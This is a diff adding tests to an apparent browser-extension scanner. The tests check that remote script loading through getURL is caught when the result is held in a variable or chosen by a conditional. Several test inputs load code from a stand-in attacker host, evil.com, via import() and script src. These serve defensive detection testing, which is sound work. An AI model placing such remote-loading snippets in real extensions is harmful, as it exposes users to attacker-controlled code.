@@ -295,6 +295,79 @@ test("JS scan treats getURL(<relative>) resources as local, not remote/ambiguous
   );
 });
 
+// A resource URL is commonly parked in a variable before it is loaded
+// (`const u = getURL("a.js"); import(u)`). That one-step indirection resolves
+// through the shared local-URL variable index, so the variable form classifies
+// exactly like the inline call - local when the argument is relative, and still
+// REMOTE when it is absolute, so the indirection masks nothing. A reassigned
+// binding cannot be proven, so it stays ambiguous.
+test("JS scan resolves a getURL result held in a variable, like the inline call", () => {
+  const clean = (code) => {
+    const t = types(code);
+    assert.ok(
+      !t.some((x) => x.startsWith("remote-") || x.startsWith("ambiguous-")),
+      `${code} -> ${JSON.stringify(t)}`
+    );
+  };
+  clean(`const u = browser.runtime.getURL("popup.js"); import(u);`);
+  clean(`const u = browser.runtime.getURL("worker.js"); importScripts(u);`);
+  clean(
+    `const u = browser.runtime.getURL("inject.js"); const s = document.createElement("script"); s.src = u;`
+  );
+  // An ABSOLUTE argument keeps its remote class through the variable.
+  assert.ok(
+    types(
+      `const u = browser.runtime.getURL("https://evil.com/x.js"); import(u);`
+    ).includes("remote-import")
+  );
+  // Reassigned -> the binding is not provably the getURL result.
+  assert.ok(
+    types(
+      `let u = browser.runtime.getURL("popup.js"); u = "https://evil.com/x.js"; import(u);`
+    ).includes("ambiguous-import")
+  );
+});
+
+// A conditional argument can take either arm at runtime, so a reference is judged
+// on ALL of them and the gravest one governs: an absolute URL in any arm is
+// reported remote rather than hidden behind a local-looking sibling. The arms are
+// read wherever they sit - standalone, nested for a third choice, inside a
+// concatenation, and whether the call is inline or held in a variable.
+test("JS scan judges every arm of a conditional getURL argument", () => {
+  const remote = (code, type) =>
+    assert.ok(
+      types(code).includes(type),
+      `${code} -> ${JSON.stringify(types(code))}`
+    );
+
+  remote(
+    `import(browser.runtime.getURL(c ? "popup.js" : "https://evil.com/x.js"));`,
+    "remote-import"
+  );
+  remote(
+    `const u = browser.runtime.getURL(c ? "popup.js" : "https://evil.com/x.js"); import(u);`,
+    "remote-import"
+  );
+  remote(
+    `import(browser.runtime.getURL(c ? "a.js" : d ? "b.js" : "https://evil.com/x.js"));`,
+    "remote-import"
+  );
+  remote(
+    `const u = browser.runtime.getURL((c ? "popup" : "https://evil.com/x") + ".js"); const s = document.createElement("script"); s.src = u;`,
+    "remote-script-src"
+  );
+  remote(
+    `const s = document.createElement("script"); s.src = browser.runtime.getURL(c ? "a.js" : "https://evil.com/x.js");`,
+    "remote-script-src"
+  );
+  // Arms that are all relative are all local: resolving every arm must not cost
+  // the clean case a finding.
+  const benign = types(
+    `import(browser.runtime.getURL(dark ? "dark.js" : "light.js"));`
+  );
+  assert.deepEqual(benign, [], JSON.stringify(benign));
+});
+
 // getURL does NOT make a reference unconditionally local: an ABSOLUTE or
 // protocol-relative argument escapes the extension origin (getURL("https://x") ->
 // "https://x"), so it must still be flagged remote - a remote/exfil URL wrapped in
